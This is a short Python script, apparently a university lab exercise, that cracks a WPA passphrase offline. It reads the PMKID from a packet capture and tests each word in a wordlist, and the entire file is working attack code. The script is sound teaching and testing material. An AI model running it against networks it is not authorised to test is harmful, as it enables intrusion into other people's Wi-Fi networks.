#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__      = "Rébecca Tevaearai et Rosy-Laure Wonjamouna"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

# Read capture file
wpa=rdpcap("PMKID_handshake.pcap") 

# Important parameters for key derivation
ssid = wpa[144].info
APmac = a2b_hex(wpa[145].addr2.replace(':', ''))
Clientmac = a2b_hex(wpa[145].addr1.replace(':', ''))
Pmkid = raw(wpa[145])[-20:-4]

f = open("wordlist.txt")
lines = f.readlines()

for line in lines:
    line = line.replace("\n", "")
    passPhrase  = str.encode(line)

    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
    pmkid = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1)

    if pmkid.digest()[:16] == Pmkid:
        print("Correct passphrase:", passPhrase.decode())
        exit()

print("no correct passphrase")
